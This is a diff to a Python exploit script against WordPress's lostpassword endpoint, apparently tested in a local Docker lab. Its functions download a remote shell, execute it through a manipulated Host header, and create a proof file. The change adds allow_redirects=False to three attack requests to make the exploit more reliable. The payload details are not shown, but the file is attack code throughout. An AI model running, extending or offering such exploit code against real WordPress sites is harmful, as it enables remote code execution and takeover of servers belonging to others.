@@ -60,7 +60,7 @@ def exploit_download(target, shell_url, username="admin"):
     }
 
     r = session.post(f"{target}/wp-login.php?action=lostpassword",
-                    data=data, timeout=15, verify=False)
+                    data=data, timeout=15, verify=False, allow_redirects=False)
     print(f"[+] Download request sent (HTTP {r.status_code})")
     return session, data
 
@@ -75,7 +75,7 @@ def exploit_execute(target, session, data, username="admin"):
 
     session.headers['Host'] = host_header
     r = session.post(f"{target}/wp-login.php?action=lostpassword",
-                    data=data, timeout=15, verify=False)
+                    data=data, timeout=15, verify=False, allow_redirects=False)
     print(f"[+] Execution request sent (HTTP {r.status_code})")
 
 
@@ -99,7 +99,7 @@ def exploit_touch(target, filepath="/tmp/success", username="admin"):
     }
 
     r = session.post(f"{target}/wp-login.php?action=lostpassword",
-                    data=data, timeout=15, verify=False)
+                    data=data, timeout=15, verify=False, allow_redirects=False)
     print(f"[+] Request sent (HTTP {r.status_code})")
     print(f"[*] Verify: docker compose exec web ls -la {filepath}")
 
